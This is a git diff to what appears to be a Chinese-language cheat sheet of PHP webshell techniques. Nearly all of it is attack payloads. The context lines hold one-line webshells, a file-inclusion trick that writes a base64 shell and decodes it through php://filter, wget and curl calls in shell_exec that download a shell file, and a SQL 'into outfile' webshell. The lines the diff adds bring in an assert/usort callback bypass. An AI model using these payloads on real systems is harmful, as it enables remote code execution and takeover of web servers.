@@ -30,6 +30,7 @@ echo `$_GET[1]`;&1=ls
 
 // local file inclusion
 include$_GET[1];             // 中間空格可以省略
+
 // 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
 $_GET[1](file,chracter,8);&1=file_put_contents .....
 include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
@@ -39,10 +40,14 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 
 <?php shell_exec('wget -O 1.php url');    // download shell
 <?php shell_exec('curl -o 1.php url');    // 預設下載index.html
+
+// 思路：延伸數組＋回調函數 php 5.4以後的特性  
+// 參考下方reference
+?1[]=blah&1[]=system();&2=assert
+param=usort(...$_GET);
 ```
 長度限制思路：  
-* 用檔名拼湊成命令,再一次ls進一個shell script[detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
-* 待續...
+* 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
 
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
 **基本上除了system都不會直接show在頁面上，exec()和shell_exec()我們都會搭個echo**
@@ -59,4 +64,7 @@ union select 1,2,"<? system($_GET['fuck']) ?>" into outfile "://path"
 
 ### Ref  
 * [千变万化的WebShell-Seebug](https://paper.seebug.org/36/)
-* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)
+* [七字短shell](http://wonderkun.cc/index.html/?p=524%EF%BC%88%E9%80%9A%E8%BF%87)  
+* [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
+* [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
+* [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
